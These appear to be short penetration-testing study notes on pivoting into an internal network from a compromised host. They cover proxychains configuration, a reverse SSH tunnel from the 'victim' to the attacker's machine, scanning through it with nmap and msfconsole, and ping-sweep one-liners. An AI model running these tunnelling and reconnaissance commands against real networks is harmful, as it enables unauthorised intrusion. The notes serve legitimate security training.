# Pivoting to an Internal Network with proxychains and SSH

Think of pivoting like: creating a tunnel for kali to wrap traffic within 
- This forces traffic from the kali machine thru the tunnel FIRST, thus allowing scanning the internal network from the victim machine
- traffic looks like it is coming from internal
- possible on any client with SSH client *OVER 7.6*

*On attacker*

`sudo vim /etc/proxychains4.conf`
- Comment out `strict_chain`
- Uncomment `dynamic_chain`
- Comment out `proxy_dns`
- Uncomment `quiet_mode`
- Change the default at the bottom to: `socks5 127.0.0.1 <portUchoose>`
    - be sure this port is unique

Make sure ssh is listening -> `sudo systemctl start/status ssh.service`

*On Victim*

`sudo ssh -N -f -R 127.0.0.1:<ipSetOnKali> user@attacker -p <differentPort>`
- you should see the regular prompts from SSH, after accepting the connection and typing the password...
- Check on attacker box `netstat -natp` you should see an open listener on 127.0.0.1<port>
- This port that is picked NEEDS to be forwarded on the router, preferably forwarding to port 22 on the host, that way we dont need to make ssh config changes

Now you can run nmap scans and even wrap tools like msfconsole in the proxy! No need to fumble around seeing if modules are even compatable with proxies.

Keep in mind, nmap *MUST* be run with: `-sT -Pn`. Without these the scan will fail as we only have access to L7 thru proxychains.

You can run a ping sweep from the victim box by:

Windows `for /l %i in (1,1,254) do @ping -n 1 -w 100 192.168.0.%i | find "Reply"` 
Linux `for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done `

Copy the Data to kali and now you have internal targets!


